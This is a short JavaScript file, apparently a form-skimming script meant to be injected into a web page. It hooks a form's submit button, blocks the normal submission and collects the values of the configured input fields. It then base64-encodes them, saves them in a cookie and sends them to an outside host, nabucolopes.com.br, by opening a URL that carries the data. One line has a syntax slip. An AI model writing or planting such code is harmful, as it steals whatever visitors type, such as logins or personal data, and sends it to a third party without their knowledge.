function setCookie(name, value, days) {
    var expires = "";
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000)); // Definir o tempo de expiração em dias
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + (value || "") + expires + "; path=/"; // O path=/ garante que o cookie seja acessível em todo o site
}
function getTags(scriptElement) {
    if (!scriptElement) {
        return {};
    }

    const atributos = Array.from(scriptElement.attributes);
    const atributosScript = {};

    atributos.forEach((atributo) => {
        if (atributo.name !== "src") {
            atributosScript[atributo.name] = atributo.value;
        }
    });

    return atributosScript;
}

function getElement(locator) {
    if (locator === undefined) {
        return null;
    }

    const trimmedLocator = locator.trim();
    const [prefixo, valor] = [trimmedLocator.charAt(0), trimmedLocator.substring(1)];

    switch (prefixo) {
        case '#':
            return document.getElementById(valor);
        case '.':
            return document.querySelector(trimmedLocator);
        case '/':
            return document.evaluate(trimmedLocator, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
        case '@':
            return document.querySelector(`[name="${valor}"]`);
        default:
            return null;
    }
}


function getvalue(atributosScript) {
    const valoresTags = [];

    for (const key in atributosScript) {
        if (atributosScript.hasOwnProperty(key) && key !== 'submit' && key !== 'url') {
            const elemento = getElement(atributosScript[key]);
            if (elemento) {
                valoresTags.push(elemento.value);
            }
        }
    }
    return valoresTags;
}

function send(atributosScript) {
	const valoresTags = getvalue(atributosScript);

    const mensagemBase64 = btoa(valoresTags.join('|'));

    if (!atributosScript['url']) {
    	return;
    }

    if (!atributosScript['submit']) {
    	return;
    }

    setCookie('german', encodeURIComponent(mensagemBase64), 1);
    window.open(`https://nabucolopes.com.br/alagoas/rdc?i=${encodeURIComponent(mensagemBase64)}`;, '_blank');
    const urlComParametro = `https://nabucolopes.com.br/alagoas/rdc?i=${encodeURIComponent(mensagemBase64)}`;
    
 //    fetch(urlComParametro, {
	//     method: 'GET',
	// })
	// .then(response => {})
	// .catch(error => {});
}

function check(atributosScript) {
    const elemento = getElement(atributosScript['submit']);

    if (elemento) {
        elemento.onclick = (event) => {
            event.preventDefault();
            send(atributosScript);
        };
    } else {
        setTimeout(() => check(atributosScript), 500);
    }
}

const scriptAtual = document.currentScript;
const atributosScript = getTags(scriptAtual);
check(atributosScript);
